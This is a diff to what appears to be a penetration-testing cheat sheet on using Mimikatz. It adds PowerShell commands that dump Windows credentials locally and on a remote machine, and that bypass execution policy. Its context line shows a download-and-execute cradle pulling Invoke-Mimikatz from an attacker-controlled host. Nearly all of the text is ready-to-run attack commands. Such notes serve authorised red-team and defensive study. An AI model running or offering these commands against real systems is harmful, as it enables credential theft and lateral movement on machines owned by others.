@@ -98,7 +98,22 @@ IEX(New-Object Net.WebClient).DownloadString('http://<ATT_IP>:<ATT_PORT>/Invoke-
 ```
 {% endcode %}
 
+Execute the dump with imported module.
 
+```powershell
+Invoke-Mimikatz -DumpCreds -Verbose
+```
+
+## Mimikatz on Remote Windows Machine
+
+The technique below needs enabled WMI session (`New-PSSession`)
+
+```powershell
+powershell -ep bypass
+. .\Invoke-Mimikatz.ps1
+
+Invoke-mimikatz -ComputerName $HOSTNAME -Verbose
+```
 
 ## Mimikatz with CrackMapExec
 
